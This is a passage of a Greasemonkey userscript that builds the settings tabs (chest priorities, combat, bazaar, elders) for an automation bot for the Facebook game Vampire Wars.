        autoChestPrio6Text.innerHTML  = "Priority 6:";
  var autoChestPrio6 = makeElement('select', chestDiv, {'style':'position: absolute; top: 150px; left:80px;', 'id':'autoChestPrio6','title':'Select your 6th most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio6.appendChild(choice);
	}
	autoChestPrio6.selectedIndex = GM_getValue('autoChestPrio6', 5);

  var autoChestPrio7Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 177px; left:10px;  color: #FFFFFF;','title':'Select your 7th most desired Chest item'});
        autoChestPrio7Text.innerHTML  = "Priority 7:";
  var autoChestPrio7 = makeElement('select', chestDiv, {'style':'position: absolute; top: 175px; left:80px;', 'id':'autoChestPrio7','title':'Select your 7th most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio7.appendChild(choice);
	}
	autoChestPrio7.selectedIndex = GM_getValue('autoChestPrio7', 6);

  var autoChestPrio8Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 202px; left:10px;  color: #FFFFFF;','title':'Select your 8th most desired Chest item'});
        autoChestPrio8Text.innerHTML  = "Priority 8:";
  var autoChestPrio8 = makeElement('select', chestDiv, {'style':'position: absolute; top: 200px; left:80px;', 'id':'autoChestPrio8','title':'Select your 8th most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio8.appendChild(choice);
	}
	autoChestPrio8.selectedIndex = GM_getValue('autoChestPrio8', 7);

  var autoPublishAncientChestsSkip = makeElement('div', chestDiv, {'style':'position: absolute; text-align: left; top: 227px; left: 0px;'});
  makeElement('input', autoPublishAncientChestsSkip, {'type':'checkbox', 'id':'autoPublishAncientChestsSkip', 'value':''}, 'autoPublishAncientChestsSkip');
  makeElement('label', autoPublishAncientChestsSkip, {'for':'autoPublishAncientChestsSkip', 'title':'Check this to skip publishing Ancient Chests'}).appendChild(document.createTextNode(' Skip Chest Publishing'));

  var autoPublishAncientChestsWait = makeElement('div', chestDiv, {'style':'position: absolute; text-align: left; top: 252px; left: 0px;'});
  makeElement('input', autoPublishAncientChestsWait, {'type':'checkbox', 'id':'autoPublishAncientChestsWait', 'value':''}, 'autoPublishAncientChestsWait');
  makeElement('label', autoPublishAncientChestsWait, {'for':'autoPublishAncientChestsWait', 'title':'Check this to wait until all your energy is used up before selecting Ancient Chests'}).appendChild(document.createTextNode(' Wait until energy is used before selecting'));

	
/* Combat tab*/
	var combatTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'combatTab'});

    var autoFight = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
        autoFight.innerHTML  = "<input type='checkbox' id='autoFight' value='checked' "+GM_getValue('autoFight', '')+">enable auto-Fight";

    var fightKeepRage = makeElement('div', combatTab,{'style':'position: absolute; left:60px;  top: 25px; color: #FFFFFF;'});
		fightKeepRage.innerHTML = "fight above Rage: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightKeepRage', '0') + "' id='fightKeepRage' size='1'>";

// User changable parameter to include fightExpGain (the average Exp gained per rage) - used to calculate when to use Rage Buff
    var fightExpGain = makeElement('div', combatTab,{'style':'position: absolute; left:60px;  top: 45px; color: #FFFFFF;'});
		fightExpGain.innerHTML = "Avg. Fight Exp Gain: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightExpGain', '3') + "' id='fightExpGain' size='1'>";

    var autoHeal = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 65px; color: #FFFFFF;'});
        autoHeal.innerHTML  = "<input type='checkbox' id='autoHeal' value='checked' "+GM_getValue('autoHeal', 'checked')+">enable auto-Heal";

    var healthLevel = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 90px; color: #FFFFFF;'});
		healthLevel.innerHTML = "min. health: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('healthLevel', '50') + "' id='healthLevel' size='1'>";

    var healthRage = makeElement('div', combatTab,{'style':'position: absolute; left:160px;  top: 90px; color: #FFFFFF;'});
		healthRage.innerHTML = "max. Rage: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('healthRage', '5') + "' id='healthRage' size='1'>";

// Automatically add to avoid list vamps I have lost to 
    var autoFightAvoidLost = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 115px; color: #FFFFFF;'});
        autoFightAvoidLost.innerHTML  = "<input type='checkbox' id='autoFightAvoidLost' value='checked' "+GM_getValue('autoFightAvoidLost', 'checked')+">Avoid Vamps I have lost to";

    var autoFightLossListSize = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 135px; color: #FFFFFF;'});
		autoFightLossListSize.innerHTML = "Keep list of last <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoFightLossListSize', '50') + "' id='autoFightLossListSize' size='1'> losses";

    var showLostLog = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 160px; color: #FFFFFF;'});
        showLostLog.innerHTML  = "<input type='checkbox' id='showLostLog' value='checked' "+GM_getValue('showLostLog', 'checked')+">Show Lost Fights Log";

    var stayZombie = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 185px; color: #FFFFFF;'});
        stayZombie.innerHTML  = "<input type='checkbox' id='stayZombie' value='checked' "+GM_getValue('stayZombie', 'checked')+">Stay Zombie when rage <";

    var stayZombieRage = makeElement('div', combatTab,{'style':'position: absolute; left:225px;  top: 187px; color: #FFFFFF;'});
	stayZombieRage.innerHTML = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('stayZombieRage', '5') + "' id='stayZombieRage' size='1'>";

    var autoFightAttackLimit = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 210px; color: #FFFFFF;'});
        autoFightAttackLimit.innerHTML  = "<input type='checkbox' id='autoFightAttackLimit' "+GM_getValue('autoFightAttackLimit', 'checked')+">Limit Repeated Attacks<br>&nbsp;&nbsp;&nbsp;&nbsp;on same Vamp";

    var autoFightAttackLimitMax = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 250px; color: #FFFFFF;'});
	autoFightAttackLimitMax.innerHTML = "Max <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoFightAttackLimitMax', '7') + "' id='autoFightAttackLimitMax' size='2'> attacks on same vamp ";

    var autoFightAttackLimitListSize = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 270px; color: #FFFFFF;'});
	autoFightAttackLimitListSize.innerHTML = "in last <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoFightAttackLimitListSize', '20') + "' id='autoFightAttackLimitListSize' size='3'> total attacks.";


    var showGoodTargets = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 295px; color: #FFFFFF;'});
        showGoodTargets.innerHTML  = "<input type='checkbox' id='showGoodTargets' value='checked' "+GM_getValue('showGoodTargets', 'checked')+">Show Good Targets List";

    var autoGoodTargetListSize = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 315px; color: #FFFFFF;'});
		autoGoodTargetListSize.innerHTML = "Keep list of last <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoGoodTargetListSize', '50') + "' id='autoGoodTargetListSize' size='1'> Good Targets";

    var goodTargetsMinLevel = makeElement('div', combatTab,{'style':'position: absolute; left:40px;  top: 335px; color: #FFFFFF;'});
	goodTargetsMinLevel.innerHTML = "Lvl: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goodTargetsMinLevel', '1') + "' id='goodTargetsMinLevel' size='1'>";
	
    var goodTargetsMaxLevel = makeElement('div', combatTab,{'style':'position: absolute; left:100px;  top: 335px; color: #FFFFFF;'});
	goodTargetsMaxLevel.innerHTML = "to <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goodTargetsMaxLevel', '100') + "' id='goodTargetsMaxLevel' size='1'>";

    var goodTargetsMinSR = makeElement('div', combatTab,{'style':'position: absolute; left:170px;  top: 335px; color: #FFFFFF;'});
	goodTargetsMinSR.innerHTML = "SR: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goodTargetsMinSR', '1400') + "' id='goodTargetsMinSR' size='1'>";
	
    var goodTargetsMaxSR = makeElement('div', combatTab,{'style':'position: absolute; left:230px;  top: 335px; color: #FFFFFF;'});
	goodTargetsMaxSR.innerHTML = "to <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('goodTargetsMaxSR', '3000') + "' id='goodTargetsMaxSR' size='1'>";

		
    var fightRandom = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 0px; color: #FFFFFF;'});
        fightRandom.innerHTML  = "<input type='radio' name='r1' id='fightRandom' value='checked' "+GM_getValue('fightRandom', '')+"> <strong>Fight random vampires</strong>";

    var fightMinLevel = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 25px; color: #FFFFFF;'});
	fightMinLevel.innerHTML = "Lvl&nbsp;&nbsp;&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightMinLevel', '1') + "' id='fightMinLevel' size='1'>";
	
    var fightLevel = makeElement('div', combatTab,{'style':'position: absolute; left:410px;  top: 25px; color: #FFFFFF;'});
	fightLevel.innerHTML = "Max: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightLevel', '100') + "' id='fightLevel' size='1'>";

    var fightLevelRelativeDiv = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 45px; color: #FFFFFF;'});
	var fightLevelRelative = makeElement('input', fightLevelRelativeDiv, {'type':'checkbox', 'id':'fightLevelRelative', 'value':'checked'}, 'fightLevelRelative');
	fightLevelRelativeDiv.appendChild(document.createTextNode(' Relative'));
	
    var fightLevelRelDisplayDiv = makeElement('div', combatTab,{'style':'position: absolute; left:385px;  top: 50px; color: #AA0000;', 'id':'fightLevelRelDisplay'});

	// Handler to display relative fight levels if checked
	var fight_level_handler = function() {
		var fightLevelRelativeMin = level-document.getElementById('fightMinLevel').value;
		var fightLevelRelativeMax = level+parseInt(document.getElementById('fightLevel').value);
		fightLevelRelDisplayDiv.innerHTML = "("+fightLevelRelativeMin+" - "+fightLevelRelativeMax+")";

		if (fightLevelRelative.checked) {
			fightLevelRelDisplayDiv.style.display = '';
		} else {
			fightLevelRelDisplayDiv.style.display = 'none';
		}
	}
	fight_level_handler();

	fightLevelRelative.addEventListener('change', fight_level_handler, false);
	fightMinLevel.addEventListener('change', fight_level_handler, false);
	fightLevel.addEventListener('change', fight_level_handler, false);


    var fightMinClanSize = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 75px; color: #FFFFFF;'});
	fightMinClanSize.innerHTML = "Clan&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightMinClanSize', '1') + "' id='fightMinClanSize' size='1'>";
	
    var fightClanSize = makeElement('div', combatTab,{'style':'position: absolute; left:410px;  top: 75px; color: #FFFFFF;'});
	fightClanSize.innerHTML = "Max: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightClanSize', '502') + "' id='fightClanSize' size='1'>";
	
    var fightClanRating = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 100px; color: #FFFFFF;'});
	fightClanRating.innerHTML = "Skill&nbsp;&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightClanRating', '1400') + "' id='fightClanRating' size='1'>";
	
    var fightClanMaxRating = makeElement('div', combatTab,{'style':'position: absolute; left:410px;  top: 100px; color: #FFFFFF;'});
	fightClanMaxRating.innerHTML = "Max: <input type='text' style='border: none; width: 40px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightClanMaxRating', '3000') + "' id='fightClanMaxRating' size='1'>";

    var fightRatingRelativeDiv = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 120px; color: #FFFFFF;'});
	var fightRatingRelative = makeElement('input', fightRatingRelativeDiv, {'type':'checkbox', 'id':'fightRatingRelative', 'value':'checked'}, 'fightRatingRelative');
	fightRatingRelativeDiv.appendChild(document.createTextNode(' Relative'));

    var fightRatingRelDisplayDiv = makeElement('div', combatTab,{'style':'position: absolute; left:385px;  top: 125px; color: #AA0000;', 'id':'fightRatingRelDisplay'});

	// Handler to display relative SR if checked
	var fight_rating_handler = function() {
		var fightRatingRelativeMin = parseInt(GM_getValue('mySkillRanking', 0))-parseInt(document.getElementById('fightClanRating').value);
		var fightRatingRelativeMax = parseInt(GM_getValue('mySkillRanking', 0))+parseInt(document.getElementById('fightClanMaxRating').value);
		fightRatingRelDisplayDiv.innerHTML = "("+fightRatingRelativeMin+" - "+fightRatingRelativeMax+")";

		if (fightRatingRelative.checked) {
			fightRatingRelDisplayDiv.style.display = '';
		} else {
			fightRatingRelDisplayDiv.style.display = 'none';
		}
	}
	fight_rating_handler();

	fightRatingRelative.addEventListener('change', fight_rating_handler, false);
	fightClanRating.addEventListener('change', fight_rating_handler, false);
	fightClanMaxRating.addEventListener('change', fight_rating_handler, false);


    var fightList = makeElement('div', combatTab,{'style':'position: absolute; left:300px;  top: 175px; color: #FFFFFF;'});
	fightList.innerHTML  = "<input type='radio' name='r1' id='rFightList' value='checked' " + GM_getValue('rFightList', '') + "> <strong>Fight from list:</strong><br/><textarea style='border: none; background-color: transparent; color: #AA0000; width: 180px; height: 150px;' id='fightList'>" + GM_getValue('fightList', '') + "</textarea>";

    var fightArena = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 0px; color: #FFFFFF;'});
        fightArena.innerHTML  = "<input type='radio' name='r1' id='fightArena' value='checked' "+GM_getValue('fightArena', '')+"> <strong>Fight in Arena</strong>";

    var fightArenaMinLevel = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 25px; color: #FFFFFF;'});
	fightArenaMinLevel.innerHTML = "Lvl&nbsp;&nbsp;&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaMinLevel', '1') + "' id='fightArenaMinLevel' size='1'>";
	
    var fightArenaLevel = makeElement('div', combatTab,{'style':'position: absolute; left:660px;  top: 25px; color: #FFFFFF;'});
	fightArenaLevel.innerHTML = "Max: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaLevel', '100') + "' id='fightArenaLevel' size='1'>";

    var fightArenaLevelRelativeDiv = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 45px; color: #FFFFFF;'});
	var fightArenaLevelRelative = makeElement('input', fightArenaLevelRelativeDiv, {'type':'checkbox', 'id':'fightArenaLevelRelative', 'value':'checked'}, 'fightArenaLevelRelative');
	fightArenaLevelRelativeDiv.appendChild(document.createTextNode(' Relative'));
	
    var fightArenaLevelRelDisplayDiv = makeElement('div', combatTab,{'style':'position: absolute; left:635px;  top: 50px; color: #AA0000;', 'id':'fightArenaLevelRelDisplay'});

	// Handler to display relative fight levels if checked
	var fight_arena_level_handler = function() {
		var fightArenaLevelRelativeMin = level-document.getElementById('fightArenaMinLevel').value;
		var fightArenaLevelRelativeMax = level+parseInt(document.getElementById('fightArenaLevel').value);
		fightArenaLevelRelDisplayDiv.innerHTML = "("+fightArenaLevelRelativeMin+" - "+fightArenaLevelRelativeMax+")";

		if (fightArenaLevelRelative.checked) {
			fightArenaLevelRelDisplayDiv.style.display = '';
		} else {
			fightArenaLevelRelDisplayDiv.style.display = 'none';
		}
	}
	fight_arena_level_handler();

	fightArenaLevelRelative.addEventListener('change', fight_arena_level_handler, false);
	fightArenaMinLevel.addEventListener('change', fight_arena_level_handler, false);
	fightArenaLevel.addEventListener('change', fight_arena_level_handler, false);


    var fightArenaMinClanSize = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 75px; color: #FFFFFF;'});
	fightArenaMinClanSize.innerHTML = "Clan&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaMinClanSize', '1') + "' id='fightArenaMinClanSize' size='1'>";
	
    var fightArenaClanSize = makeElement('div', combatTab,{'style':'position: absolute; left:660px;  top: 75px; color: #FFFFFF;'});
	fightArenaClanSize.innerHTML = "Max: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaClanSize', '502') + "' id='fightArenaClanSize' size='1'>";
	
    var fightArenaRating = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 100px; color: #FFFFFF;'});
	fightArenaRating.innerHTML = "Skill&nbsp;&nbsp;&nbsp;Min: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaRating', '1400') + "' id='fightArenaRating' size='1'>";
	
    var fightArenaMaxRating = makeElement('div', combatTab,{'style':'position: absolute; left:660px;  top: 100px; color: #FFFFFF;'});
	fightArenaMaxRating.innerHTML = "Max: <input type='text' style='border: none; width: 40px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('fightArenaMaxRating', '3000') + "' id='fightArenaMaxRating' size='1'>";

    var fightArenaRatingRelativeDiv = makeElement('div', combatTab,{'style':'position: absolute; left:550px;  top: 120px; color: #FFFFFF;'});
	var fightArenaRatingRelative = makeElement('input', fightArenaRatingRelativeDiv, {'type':'checkbox', 'id':'fightArenaRatingRelative', 'value':'checked'}, 'fightArenaRatingRelative');
	fightArenaRatingRelativeDiv.appendChild(document.createTextNode(' Relative'));

    var fightArenaRatingRelDisplayDiv = makeElement('div', combatTab,{'style':'position: absolute; left:635px;  top: 125px; color: #AA0000;', 'id':'fightArenaRatingRelDisplay'});

	// Handler to display relative SR if checked
	var fight_arena_rating_handler = function() {
		var fightArenaRatingRelativeMin = parseInt(GM_getValue('mySkillRankingArena', 0))-parseInt(document.getElementById('fightArenaRating').value);
		var fightArenaRatingRelativeMax = parseInt(GM_getValue('mySkillRankingArena', 0))+parseInt(document.getElementById('fightArenaMaxRating').value);
		fightArenaRatingRelDisplayDiv.innerHTML = "("+fightArenaRatingRelativeMin+" - "+fightArenaRatingRelativeMax+")";

		if (fightArenaRatingRelative.checked) {
			fightArenaRatingRelDisplayDiv.style.display = '';
		} else {
			fightArenaRatingRelDisplayDiv.style.display = 'none';
		}
	}
	fight_arena_rating_handler();

	fightArenaRatingRelative.addEventListener('change', fight_arena_rating_handler, false);
	fightArenaRating.addEventListener('change', fight_arena_rating_handler, false);
	fightArenaMaxRating.addEventListener('change', fight_arena_rating_handler, false);


/* Bazaar tab*/
	var bazaarTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'bazaarTab'});

	var autoGifting = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
        autoGifting.innerHTML  = "<input type='checkbox' id='autoGifting' value='checked' "+GM_getValue('autoGifting', '')+">enable auto-Gifting";
	
	var selectAttribute = makeElement('select', bazaarTab, {'style':'position: absolute; top: 25px; left:40px;', 'id':'selectAttribute'});
		for each (var attribute in attributes )
		{
			var choice = document.createElement('option');
			choice.value = attribute[0];
			choice.appendChild(document.createTextNode(attribute[0]));
			selectAttribute.appendChild(choice);
		}
		selectAttribute.selectedIndex = GM_getValue('selectAttribute', 1);

	var giftingCount = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px; top: 50px; color: #FFFFFF;'});
		giftingCount.innerHTML = "Gift count: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('giftingCount', '0') + "' id='giftingCount' size='1'>";
		
	var giftingUser = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px;  top: 75px; color: #FFFFFF;'});
		giftingUser.innerHTML = "Gift to userID: <input type='text' style='border: none; width: 90px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('giftingUser', '0') + "' id='giftingUser' size='3'>";
		
	var leftAlign = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px;  top: 100px; color: #FFFFFF;'});
		leftAlign.innerHTML  = "<input type='checkbox' id='leftAlign' value='checked' "+GM_getValue('leftAlign', '')+">Align screen left";
		
	var showStatsBox = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px;  top: 125px; color: #FFFFFF;'});
		showStatsBox.innerHTML  = "<input type='checkbox' id='showStatsBox' value='checked' "+GM_getValue('showStatsBox', '')+">Show Statistics Box";

	var autoAbility = makeElement('div', bazaarTab,{'style':'position: absolute; left:40px;  top: 150px; color: #FFFFFF;'});
		autoAbility.innerHTML  = "<input type='checkbox' id='autoAbility' value='checked' "+GM_getValue('autoAbility', '')+">enable auto ability upgrading";

	var autoMinion = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 0px; color: #FFFFFF;'});
		autoMinion.innerHTML  = "<input type='checkbox' id='autoMinion' value='checked' "+GM_getValue('autoMinion', '')+'>enable auto minion purchase <br>Next minion cost: <strong class="good"><img src="http://facebook.vampires.static.zynga.com/graphics/icon-blood.gif"/>' + GM_getValue('minionCostk', 0)*1000+ '</strong>';
		
	var spendBank = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 35px; color: #FFFFFF;'});
		spendBank.innerHTML  = "<input type='checkbox' id='spendBank' value='checked' "+GM_getValue('spendBank', '')+">enable spending from bank";

	var spendBankKeep = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 60px; color: #FFFFFF;'});
		spendBankKeep.innerHTML = "Keep in bank: <input type='text' style='border: none; width: 100px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('spendBankKeep', '1000000') + "' id='spendBankKeep' size='8'>";

	var autoLog = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 100px; color: #FFFFFF;'});
		autoLog.innerHTML  = "<input type='checkbox' id='autoLog' value='checked' "+GM_getValue('autoLog', 'checked')+">Logging on - max entries: <input type='text' style='border: none; width: 50px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoLogLength', '500') + "' id='autoLogLength' size='3'>";

	var includeInLog = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 130px; color: #FFFFFF;'});
		includeInLog.innerHTML  = "Include in Log:";

	var logHealEvents = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 150px; color: #FFFFFF;'});
		logHealEvents.innerHTML  = "<input type='checkbox' id='logHealEvents' value='checked' " + GM_getValue('logHealEvents', 'checked') + "> Healing";

	var logAttackEvents = makeElement('div', bazaarTab,{'style':'position: absolute; left:385px;  top: 150px; color: #FFFFFF;'});
		logAttackEvents.innerHTML  = "<input type='checkbox' id='logAttackEvents' value='checked' " + GM_getValue('logAttackEvents', 'checked') + "> Attacking";

	var logFightResults = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 175px; color: #FFFFFF;'});
		logFightResults.innerHTML  = "<input type='checkbox' id='logFightResults' value='checked' " + GM_getValue('logFightResults', 'checked') + "> Fight Results";

	var logMissionExecution = makeElement('div', bazaarTab,{'style':'position: absolute; left:385px;  top: 175px; color: #FFFFFF;'});
		logMissionExecution.innerHTML  = "<input type='checkbox' id='logMissionExecution' value='checked' " + GM_getValue('logMissionExecution', 'checked') + "> Missions";

	var logBloodMagic = makeElement('div', bazaarTab,{'style':'position: absolute; left:275px;  top: 200px; color: #FFFFFF;'});
		logBloodMagic.innerHTML  = "<input type='checkbox' id='logBloodMagic' value='checked' " + GM_getValue('logBloodMagic', 'checked') + "> Blood Magic";

	var logMinionPurch = makeElement('div', bazaarTab,{'style':'position: absolute; left:385px;  top: 200px; color: #FFFFFF;'});
		logMinionPurch.innerHTML  = "<input type='checkbox' id='logMinionPurch' value='checked' " + GM_getValue('logMinionPurch', 'checked') + "> Minion Purch.";

	var autoPublishHeader = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 0px; color: #FFFFFF;'});
		autoPublishHeader.innerHTML  = "Auto-Publish:";

	var autoPublishBloodMagic = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 20px; color: #FFFFFF;'});
		autoPublishBloodMagic.innerHTML  = "<input type='checkbox' id='autoPublishBloodMagic' value='checked' " + GM_getValue('autoPublishBloodMagic', 'checked') + "> Blood Magic";

	var autoPublishMissionAssistance = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 45px; color: #FFFFFF;'});
		autoPublishMissionAssistance.innerHTML  = "<input type='checkbox' id='autoPublishMissionAssistance' value='checked' " + GM_getValue('autoPublishMissionAssistance', 'checked') + "> Mission Asst.";

	var autoPublishPromoMinion = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 70px; color: #FFFFFF;'});
		autoPublishPromoMinion.innerHTML  = "<input type='checkbox' id='autoPublishPromoMinion' value='checked' " + GM_getValue('autoPublishPromoMinion', 'checked') + "> Promo Minions";

	var autoPublishCollectorBox = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 95px; color: #FFFFFF;'});
		autoPublishCollectorBox.innerHTML  = "<input type='checkbox' id='autoPublishCollectorBox' value='checked' " + GM_getValue('autoPublishCollectorBox', 'checked') + "> Collector Mystery Box";


	var autoPublishFightKill = makeElement('div', bazaarTab,{'style':'position: absolute; left:630px;  top: 20px; color: #FFFFFF;'});
		autoPublishFightKill.innerHTML  = "<input type='checkbox' id='autoPublishFightKill' value='checked' " + GM_getValue('autoPublishFightKill', 'checked') + "> Kills";

	var autoPublishLevelUp = makeElement('div', bazaarTab,{'style':'position: absolute; left:630px;  top: 45px; color: #FFFFFF;'});
		autoPublishLevelUp.innerHTML  = "<input type='checkbox' id='autoPublishLevelUp' value='checked' " + GM_getValue('autoPublishLevelUp', 'checked') + "> Level Up";

	// Publish Limits:
	var autoPublishLimitHeader = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 145px; color: #FFFFFF;'});
		autoPublishLimitHeader.innerHTML  = "Publish Limits:";

	var autoPublishLimitTimeT1toT2 = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 165px; color: #FFFFFF;'});
		autoPublishLimitTimeT1toT2.innerHTML  = "<input type='checkbox' id='autoPublishLimitTimeT1toT2' value='checked' " + GM_getValue('autoPublishLimitTimeT1toT2', 'checked') + "> Between \
		<input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoPublishLimitTimeT1Time', '00:00') + "' id='autoPublishLimitTimeT1Time' size='3' title='Time MUST be formatted in HH:MM!'>\
		&amp; <input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoPublishLimitTimeT2Time', '01:00') + "' id='autoPublishLimitTimeT2Time' size='3' title='Time MUST be formatted in HH:MM!'>\
		<br>&nbsp;&nbsp;&nbsp;AND";

	var autoPublishLimitTimeT3toT4 = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 200px; color: #FFFFFF;'});
		autoPublishLimitTimeT3toT4.innerHTML  = "<input type='checkbox' id='autoPublishLimitTimeT3toT4' value='checked' " + GM_getValue('autoPublishLimitTimeT3toT4', 'checked') + "> Between \
		<input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoPublishLimitTimeT3Time', '13:00') + "' id='autoPublishLimitTimeT3Time' size='3' title='Time MUST be formatted in HH:MM!'>\
		&amp; <input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoPublishLimitTimeT4Time', '14:00') + "' id='autoPublishLimitTimeT4Time' size='3' title='Time MUST be formatted in HH:MM!'>";

	var autoPublishLimitRandom = makeElement('div', bazaarTab,{'style':'position: absolute; left:510px;  top: 225px; color: #FFFFFF;'});
		autoPublishLimitRandom.innerHTML  = "<input type='checkbox' id='autoPublishLimitRandom' value='checked' " + GM_getValue('autoPublishLimitRandom', 'checked') + "> Randomly: \
		<input type='text' style='border: none; width: 25px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoPublishLimitRandomPercent', '50') + "' id='autoPublishLimitRandomPercent' size='3'> % of the time";


/* Elders tab*/
	var eldersTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'eldersTab'});
		
	var autoGamble = makeElement('div', eldersTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
		autoGamble.innerHTML  = "<input type='checkbox' id='autoGamble' value='checked' "+GM_getValue('autoGamble', 'checked')+">enable auto Akem's Gamble";

